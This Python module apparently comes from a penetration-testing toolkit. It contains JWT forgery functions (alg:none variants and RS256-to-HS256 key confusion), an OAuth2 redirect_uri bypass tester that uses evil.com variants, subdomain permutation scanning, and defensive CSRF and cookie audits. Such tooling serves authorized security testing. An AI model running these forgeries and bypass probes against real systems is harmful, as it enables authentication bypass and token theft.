from gui.engine._core import *

# 31. JWT None-Algorithm Attack
# ---------------------------------------------------------------------------
def jwt_none_attack(token: str, log: Logger) -> dict:
    """Test if a JWT accepts the 'none' algorithm (CVE-2015-9235)."""
    import json as _json
    log("[*] JWT 'none' algorithm attack", "cyan")
    result: dict = {"forged": False, "original": token, "forged_tokens": []}

    parts = token.split(".")
    if len(parts) != 3:
        log("[-] Invalid JWT format", "err")
        return result

    def _b64u_decode(s: str) -> bytes:
        """Decode a base64url string with auto-padding."""
        s += "=" * ((4 - len(s) % 4) % 4)
        return base64.urlsafe_b64decode(s)

    def _b64u_encode(b: bytes) -> str:
        """Encode bytes to a base64url string without padding."""
        return base64.urlsafe_b64encode(b).decode().rstrip("=")

    try:
        header = _json.loads(_b64u_decode(parts[0]))
    except Exception:
        log("[-] Cannot decode JWT header", "err")
        return result

    log(f"  Original alg: {header.get('alg', '?')}", "info")

    # Forge tokens with none/None/NONE/nOnE and empty signature
    for alg in ("none", "None", "NONE", "nOnE"):
        forged_header = dict(header)
        forged_header["alg"] = alg
        new_header = _b64u_encode(_json.dumps(forged_header, separators=(",", ":")).encode())
        forged = f"{new_header}.{parts[1]}."
        result["forged_tokens"].append({"alg": alg, "token": forged})
        log(f"  Forged (alg={alg}): {forged[:60]}...", "warn")

    # Also try with original signature kept
    forged_header = dict(header)
    forged_header["alg"] = "none"
    new_header = _b64u_encode(_json.dumps(forged_header, separators=(",", ":")).encode())
    result["forged_tokens"].append({
        "alg": "none+sig",
        "token": f"{new_header}.{parts[1]}.{parts[2]}",
    })

    result["forged"] = True  # Tokens are generated; actual vulnerability requires server-side verification
    log("[!] Forged tokens generated — test these against the target API", "warn")
    log("  If any are accepted, the server is VULNERABLE to alg:none", "err")
    session_set("last_jwt_none_result", result)
    return result


# ---------------------------------------------------------------------------
# 32. JWT Key Confusion (RS256 → HS256)
# ---------------------------------------------------------------------------
def jwt_key_confusion(token: str, public_key: str, log: Logger) -> dict:
    """Attempt RS256→HS256 key confusion attack."""
    import hmac as _hmac
    import json as _json
    log("[*] JWT key confusion attack (RS256→HS256)", "cyan")
    result: dict = {"forged": False, "original": token, "forged_token": ""}

    parts = token.split(".")
    if len(parts) != 3:
        log("[-] Invalid JWT format", "err")
        return result

    def _b64u_encode(b: bytes) -> str:
        """Encode bytes to a base64url string without padding."""
        return base64.urlsafe_b64encode(b).decode().rstrip("=")

    def _b64u_decode(s: str) -> bytes:
        """Decode a base64url string with auto-padding."""
        s += "=" * ((4 - len(s) % 4) % 4)
        return base64.urlsafe_b64decode(s)

    try:
        header = _json.loads(_b64u_decode(parts[0]))
    except Exception:
        log("[-] Cannot decode header", "err")
        return result

    if header.get("alg") not in ("RS256", "RS384", "RS512"):
        log(f"[-] Original alg is {header.get('alg')}, not RS*", "warn")

    # Forge with HS256 using public key as HMAC secret
    forged_header = {"alg": "HS256", "typ": "JWT"}
    new_header = _b64u_encode(_json.dumps(forged_header, separators=(",", ":")).encode())
    signing_input = f"{new_header}.{parts[1]}".encode()

    # Try PEM key as-is
    key_bytes = public_key.encode() if isinstance(public_key, str) else public_key
    sig = _hmac.new(key_bytes, signing_input, "sha256").digest()
    forged = f"{new_header}.{parts[1]}.{_b64u_encode(sig)}"

    result["forged_token"] = forged
    result["forged"] = True  # Token forged; actual vulnerability requires server-side verification
    log(f"  Forged token (HS256 with public key): {forged[:60]}...", "warn")
    log("[!] Test this token against the API — if accepted, server is VULNERABLE", "err")
    session_set("last_jwt_confusion_result", result)
    return result


# ---------------------------------------------------------------------------
# 33. CSRF Token Analyzer
# ---------------------------------------------------------------------------
def csrf_analyze(url: str, log: Logger) -> dict:
    """Analyze CSRF protections on a web form."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    log(f"[*] CSRF analysis: {url}", "cyan")
    result: dict = {"url": url, "tokens_found": [], "issues": [], "score": 100}

    try:
        resp = requests.get(url, timeout=15, verify=TLS_VERIFY,
                            headers={"User-Agent": random_ua()},
                            allow_redirects=True)
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return result

    body = resp.text.lower()

    # Check for CSRF tokens in forms
    csrf_names = ("csrf", "_token", "authenticity_token", "xsrf", "__requestverificationtoken",
                  "csrfmiddlewaretoken", "_csrf_token", "anti-forgery")
    found_tokens = []
    for name in csrf_names:
        if name in body:
            found_tokens.append(name)
    result["tokens_found"] = found_tokens

    if not found_tokens:
        result["issues"].append("No CSRF token found in forms")
        result["score"] -= 40
        log("[!] No CSRF token found — forms may be vulnerable", "err")
    else:
        log(f"[+] CSRF token(s) found: {', '.join(found_tokens)}", "ok")

    # Check SameSite cookie attribute
    samesite_ok = False
    # Use raw headers — Set-Cookie should NOT be split on comma
    # because Expires values contain commas (e.g. "Thu, 01 Jan 2025")
    raw_set_cookies = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else []
    if not raw_set_cookies:
        # Fallback: split only on comma-space-uppercase (new cookie start)
        raw_val = resp.headers.get("Set-Cookie", "")
        if raw_val:
            import re as _re
            raw_set_cookies = _re.split(r",\s*(?=[A-Za-z_][\w]*=)", raw_val)
    for cookie_hdr in raw_set_cookies:
        if "samesite" in cookie_hdr.lower():
            if "strict" in cookie_hdr.lower() or "lax" in cookie_hdr.lower():
                samesite_ok = True

    if not samesite_ok:
        result["issues"].append("No SameSite cookie attribute")
        result["score"] -= 20
        log("[!] No SameSite cookie attribute set", "warn")
    else:
        log("[+] SameSite cookie attribute present", "ok")

    # Check for custom headers requirement (X-Requested-With, etc.)
    # Try request without standard AJAX header
    try:
        resp2 = requests.post(url, timeout=REQUEST_TIMEOUT, verify=TLS_VERIFY, data={},
                              headers={"User-Agent": random_ua()})
        if resp2.status_code not in (403, 401, 405):
            result["issues"].append("POST accepted without CSRF header/token")
            result["score"] -= 20
    except requests.RequestException:
        pass

    result["score"] = max(0, result["score"])
    tag = "ok" if result["score"] >= 80 else ("warn" if result["score"] >= 50 else "err")
    log(f"  CSRF protection score: {result['score']}/100", tag)
    session_set("last_csrf_result", result)
    return result


# ---------------------------------------------------------------------------
# 34. Cookie Security Audit
# ---------------------------------------------------------------------------
def cookie_audit(url: str, log: Logger) -> dict:
    """Audit cookie security attributes (Secure, HttpOnly, SameSite, etc.)."""
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    log(f"[*] Cookie security audit: {url}", "cyan")
    result: dict = {"url": url, "cookies": [], "issues": []}

    try:
        resp = requests.get(url, timeout=15, verify=TLS_VERIFY,
                            headers={"User-Agent": random_ua()},
                            allow_redirects=True)
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return result

    if not resp.cookies and "set-cookie" not in {k.lower() for k in resp.headers}:
        log("[-] No cookies set by this URL", "muted")
        return result

    # Parse Set-Cookie headers for full attribute visibility
    # Use raw headers to avoid comma-splitting Expires dates
    raw_set_cookies = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else []
    if not raw_set_cookies:
        raw_val = resp.headers.get("Set-Cookie", "")
        if raw_val:
            import re as _re
            raw_set_cookies = _re.split(r",\s*(?=[A-Za-z_][\w]*=)", raw_val)
    for hdr_val in raw_set_cookies:
        if not hdr_val:
            continue
        parts = [p.strip() for p in hdr_val.split(";")]
        if not parts:
            continue
        name_val = parts[0]
        name = name_val.split("=", 1)[0] if "=" in name_val else name_val
        attrs_lower = " ".join(parts[1:]).lower()

        cookie_info: dict = {
            "name": name,
            "secure": "secure" in attrs_lower,
            "httponly": "httponly" in attrs_lower,
            "samesite": "missing",
            "has_expiry": "expires" in attrs_lower or "max-age" in attrs_lower,
        }
        if "samesite=strict" in attrs_lower:
            cookie_info["samesite"] = "strict"
        elif "samesite=lax" in attrs_lower:
            cookie_info["samesite"] = "lax"
        elif "samesite=none" in attrs_lower:
            cookie_info["samesite"] = "none"

        issues = []
        if not cookie_info["secure"]:
            issues.append("Missing Secure flag")
        if not cookie_info["httponly"]:
            issues.append("Missing HttpOnly flag")
        if cookie_info["samesite"] == "missing":
            issues.append("SameSite attribute missing")
        elif cookie_info["samesite"] == "none" and not cookie_info["secure"]:
            issues.append("SameSite=None without Secure flag")
        if name.startswith("__Host-") and not cookie_info["secure"]:
            issues.append("__Host- prefix requires Secure")
        if name.startswith("__Secure-") and not cookie_info["secure"]:
            issues.append("__Secure- prefix requires Secure")

        cookie_info["issues"] = issues
        result["cookies"].append(cookie_info)
        result["issues"].extend(issues)

        tag = "ok" if not issues else "warn"
        log(f"  {name}: {'✓' if not issues else '✗'} {', '.join(issues) if issues else 'all flags OK'}", tag)

    total = len(result["cookies"])
    bad = sum(1 for c in result["cookies"] if c["issues"])
    log(f"\n  {total} cookie(s), {total - bad} secure, {bad} with issues",
        "ok" if bad == 0 else "warn")
    session_set("last_cookie_audit", result)
    return result


# ---------------------------------------------------------------------------
# 35. OAuth2 Flow Tester
# ---------------------------------------------------------------------------
def oauth2_test(auth_url: str, redirect_uri: str, log: Logger) -> dict:
    """Test OAuth2 authorization endpoint for redirect_uri manipulation."""
    import requests
    from urllib.parse import urlparse, urlencode, parse_qs
    log(f"[*] OAuth2 redirect_uri test: {auth_url}", "cyan")
    result: dict = {"auth_url": auth_url, "tests": [], "issues": []}

    parsed = urlparse(redirect_uri)
    base_domain = parsed.netloc

    # Generate manipulated redirect_uri variants
    variants = [
        ("Original", redirect_uri),
        ("Evil subdomain", redirect_uri.replace(base_domain, f"evil.{base_domain}")),
        ("Evil path", redirect_uri.rstrip("/") + ".evil.com"),
        ("Open redirect", redirect_uri + "/../@evil.com"),
        ("Param injection", redirect_uri + "?rd=https://evil.com"),
        ("Fragment bypass", redirect_uri + "#@evil.com"),
        ("URL encoding", redirect_uri.replace("://", "%3A%2F%2F")),
        ("Null byte", redirect_uri + "%00.evil.com"),
        ("Backslash", redirect_uri.replace("/", "\\")),
        ("Double redirect", f"https://evil.com?url={urllib.parse.quote(redirect_uri)}"),
    ]

    for name, variant in variants:
        if _should_stop():
            break
        test_url = auth_url
        sep = "&" if "?" in auth_url else "?"
        test_url += f"{sep}redirect_uri={urllib.parse.quote(variant, safe='')}"
        try:
            resp = requests.get(test_url, timeout=REQUEST_TIMEOUT, verify=TLS_VERIFY,
                                allow_redirects=False,
                                headers={"User-Agent": random_ua()})
            status = resp.status_code
            location = resp.headers.get("Location", "")
            accepted = status in (301, 302, 303, 307, 308) and variant in location
            test_result = {"name": name, "variant": variant[:80], "status": status,
                           "accepted": accepted}
            result["tests"].append(test_result)
            if accepted:
                result["issues"].append(f"Accepted: {name}")
                log(f"  [!] {name}: ACCEPTED (status {status})", "err")
            else:
                log(f"  [+] {name}: rejected (status {status})", "ok")
        except requests.RequestException as exc:
            log(f"  [-] {name}: {exc}", "muted")
            result["tests"].append({"name": name, "error": str(exc)})

    if result["issues"]:
        log(f"[!] {len(result['issues'])} redirect_uri bypass(es) found!", "err")
    else:
        log("[+] All redirect_uri variants properly rejected", "ok")
    session_set("last_oauth2_result", result)
    return result


# ---------------------------------------------------------------------------
# 36. Subdomain Permutation (altdns-style)
# ---------------------------------------------------------------------------
ALTDNS_WORDS = [
    "dev", "staging", "stage", "stg", "test", "testing", "uat", "qa",
    "preprod", "pre", "prod", "production", "api", "app", "admin",
    "internal", "intranet", "vpn", "mail", "email", "mx", "portal",
    "cdn", "media", "static", "assets", "img", "images", "docs",
    "beta", "alpha", "demo", "sandbox", "lab", "old", "new", "legacy",
    "backup", "bak", "temp", "tmp", "db", "database", "sql", "redis",
    "cache", "search", "elastic", "kibana", "grafana", "monitor",
    "jenkins", "ci", "cd", "git", "gitlab", "github", "bitbucket",
    "docker", "k8s", "kube", "aws", "gcp", "azure", "cloud",
    "auth", "sso", "login", "oauth", "iam", "ldap", "ftp", "sftp",
    "ssh", "proxy", "gateway", "lb", "load", "web", "www", "www2",
]


def subdomain_permutation(domain: str, log: Logger) -> list[dict]:
    """Generate and resolve altdns-style subdomain permutations."""
    import socket as _socket
    log(f"[*] Subdomain permutation scan: {domain}", "cyan")
    results: list[dict] = []

    parts = domain.split(".")
    base = parts[0] if len(parts) > 1 else domain
    rest = ".".join(parts[1:]) if len(parts) > 1 else "com"

    # Generate permutations
    candidates: set[str] = set()
    for word in ALTDNS_WORDS:
        candidates.add(f"{word}.{domain}")              # word.example.com
        candidates.add(f"{word}-{base}.{rest}")          # word-sub.example.com
        candidates.add(f"{base}-{word}.{rest}")          # sub-word.example.com
        candidates.add(f"{word}{base}.{rest}")           # wordsub.example.com

    # Remove the original domain itself
    candidates.discard(domain)
    log(f"  Generated {len(candidates)} candidates", "info")

    resolved = 0
    for candidate in sorted(candidates):
        if _should_stop():
            break
        try:
            ip = _socket.gethostbyname(candidate)
            results.append({"subdomain": candidate, "ip": ip})
            resolved += 1
            log(f"[+] {candidate} → {ip}", "ok")
        except _socket.gaierror:
            pass

    log(f"[*] {resolved}/{len(candidates)} permutations resolved", "cyan")
    session_set("last_subdomain_perm", results)
    return results


# ---------------------------------------------------------------------------
